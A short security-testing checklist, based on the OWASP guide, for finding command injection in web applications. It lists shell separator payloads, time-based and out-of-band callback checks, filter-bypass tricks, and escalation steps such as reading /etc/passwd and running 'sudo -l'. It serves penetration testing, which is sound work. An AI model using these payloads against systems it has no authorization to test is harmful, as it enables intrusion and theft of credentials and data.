# OWASP WSTG-INPV-12: Command Injection Testing

Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection

## Step 1 — Identify command-likely parameters

Parameters named: ip, host, ping, cmd, exec, command, lookup,
domain, url, filename, path.
Features: ping utility, DNS lookup, file operations, system info.

## Step 2 — Test command separators (try each)

- `; id`       (Unix semicolon separator)
- `| id`       (Unix pipe)
- `&& id`      (Unix AND — runs if first succeeds)
- `|| id`      (Unix OR — runs if first fails)
- `` `id` ``   (Unix backtick substitution)
- `$(id)`      (Unix subshell)
- For Windows: `& dir`, `| dir`, `&& dir`

## Step 3 — Check for command output in response

Look for: `uid=`, `root:`, `www-data`, directory listings,
Windows user info, system information.

## Step 4 — If blind (no output visible)

Time-based: `; sleep 5` → response takes 5+ seconds?
OOB: `; curl http://your-callback-server` → check for hit.

## Step 5 — If filtered

- Spaces blocked → use `${IFS}` (Unix internal field separator)
- Semicolons blocked → try `|` or `&&`
- Commands blocked → try: `w\ho\ami`, `/bin/w?oami`, `cat$u /etc/passwd`

## Step 6 — Escalate if confirmed

Read `/etc/passwd`, check current user (`id`), check `sudo -l`,
read application config files.
